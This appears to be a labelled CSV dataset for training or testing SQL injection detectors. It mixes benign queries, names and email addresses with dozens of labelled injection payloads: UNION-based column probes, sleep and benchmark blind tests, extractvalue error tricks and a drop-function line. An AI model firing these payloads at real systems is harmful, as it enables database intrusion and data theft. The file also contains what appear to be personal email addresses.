 update doing set die = 'damage'where harbor = 'heat',0,0,0.0
"   select perfectly,fear,rhythm,sharp,handsome     (  (  forgot join type on broke.greatly =  older.pack )   inner join buffaloon orders.prize =  enough.courtid ) ",0,0,0.0
select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,1,1,1.0
"-6108'  )   union all select 2519,2519,2519,2519--",1,1,1.0
select * from driver,0,0,0.0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,1.0
"1"" where 8333  =  8333",1,1,1.0
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",1,1,1.0
8230,0,0,0.004468253314358248
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1,1,1.0
union select,1,1,0.7006308761792265
select * from breeze where accept = 'pet'  or out = 'gave',0,0,0.0
select avg ( well ) from drop select sum ( statement ) ,0,0,0.0
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,1,1,1.0
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
d76en3r9n8z01,0,0,0.004468253314358248
select * from forgot where either not like '[lion]%',0,0,0.0
"   select tip, half, drivingfrom physical where usual  is not null",0,0,0.0
chaddie,0,0,0.004468253314358248
1%'  )   or sleep  (  5  )  #,1,1,1.0
"1   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
1' where 2958  =  2958,1,1,1.0
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,1,1.0
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1,1,1.0
select avg ( milk ) from than,0,0,0.0
select * from cup where care between '1996-07-01' and '1996-07-31',0,0,0.0
alcoholado sabaters,0,0,0.004468253314358248
"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
1139,0,0,0.004468253314358248
raimondo,0,0,0.004468253314358248
select top 3 * from hello,0,0,0.0
select * from liquid order by pond,0,0,0.0
artigas girut,0,0,0.004468253314358248
zacaras,0,0,0.004468253314358248
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1,1,1.0
desans totohuetotzint,0,0,0.004468253314358248
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,1.0
graciano,0,0,0.004468253314358248
1'  )   where 1917  =  1917 union all select null#,1,1,1.0
"1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
"1""  )   where 1607  =  1607",1,1,1.0
9ei91n,0,0,0.004468253314358248
9.4488e+15,0,0,0.0
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",1,1,1.0
1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,1,1,1.0
61089913g,0,0,0.004468253314358248
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1,1,0.99
75u1al3e,0,0,0.004468253314358248
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",1,1,1.0
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",1,1,1.0
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1,1,1.0
-4173'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'jdwt' like 'jdwt,1,1,1.0
select congress ( s ) from shirt inner join,0,0,0.0
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",1,1,0.98
select * from article where fruit not between 'visit' and 'one',0,0,0.0
"1""   )    )    as wssb where 5772  =  5772",1,1,1.0
98810075m,0,0,0.004468253314358248
"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select member ( s )  from mood select clothing ( s ) ,0,0,0.0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
select third from dozen union all select wonderful from opportunity order by welcome,0,0,0.0
"   select count ( police ) , official from won by bring",0,0,0.0
if  (  4735  =  8907  )   select 4735 else drop function qigo--,1,1,1.0
"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,1.0
"-1766""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""ydzq"" like ""ydzq",1,1,1.0
nicole-meyer@creacionesdolcevita.us,0,0,0.006527024015406931
select distinct statement from swam,0,0,0.0
dean,0,0,0.004468253314358248
cadenat.mulich@4ghz.do,0,0,0.004468253314358248
alcalde gregorio espino 165,0,0,0.004468253314358248
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
rougerie@cincocolores.sd,0,0,0.004468253314358248
"  select information,characteristic,ask from door left join orders on screen.liftid =  car.angry order by buried.got",0,0,0.0
"1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"   select change, dance, toyfrom value where came  is not null",0,0,0.0
select * from cowboy fetch first 50 percent rows only,0,0,0.0
select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',1,1,1.0
select avg ( lying ) from be,0,0,0.0
select * from met order by but,0,0,0.0
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1,1,0.9816666666666666
select * from radio  where means = suppose,0,0,0.0
select * from printed where halfway between 'degree' and 'blew',0,0,0.0
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,1,1.0
" select column_name ( s )  from rule,bat",0,0,0.0
select count ( tightly )  from eleven,0,0,0.0
delete from section where underline = 'shoot',0,0,0.0
from  ( select distinct magnet from stone ) ,0,0,0.0
"   select die, hard+ ', ' + ask+ ' ' + suggest+ ', ' + drop as threw  from ability",0,0,0.0
protectorio,0,0,0.004468253314358248
select avg ( map ) from still,0,0,0.0
select top 50 percent * from across,0,0,0.0
villavendimio,0,0,0.004468253314358248
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",1,1,1.0
99783130e,0,0,0.004468253314358248
select * from running where    not rocky = 'involved',0,0,0.0
" select * from average order by sure, find",0,0,0.0
select count ( villageid ) from as,0,0,0.08
select * from famous where enter not like '[song]%',0,0,0.0
"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1,1,1.0
select * from adjective where larger in  ( select tried from pond ) ,0,0,0.0
35210254z,0,0,0.004468253314358248
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",1,1,1.0
select * from given where though = 'breathe',0,0,0.0
"   select diagram, early, curious from chemical where huge  is null",0,0,0.0
1%'  )   and sleep  (  5  )   and   (  '%'  =  ',1,1,1.0
"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1,1,1.0
42685012w,0,0,0.004468253314358248
select top 3 * from examine select * from chair 3select * from scientist,0,0,0.0
"-1859' union all select 1781,1781,1781,1781#",1,1,1.0
"-9751""   )    )     )   or 5929  =  3884--",1,1,1.0
" select * from stiff order by dollar, steady",0,0,0.0
19187311k,0,0,0.004468253314358248
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1,1,1.0
nassiet.birkin@cienciapolicial.gl,0,0,0.004468253314358248
horalek,0,0,0.004468253314358248
1' where 8635  =  8635 order by 1--,1,1,1.0
select * from receive where price not between 10 and 20,0,0,0.0
1'  )   as bzem where 4240  =  4240,1,1,0.95
"-7007  )   union all select 6704,6704--",1,1,1.0
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1,1,1.0
1'||  (  select 'uebk' from dual where 6990  =  6990,1,1,1.0
select thy ( s )  from engine union,0,0,0.0
isaciar,0,0,0.004468253314358248
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",1,1,1.0
carre mamani,0,0,0.004468253314358248
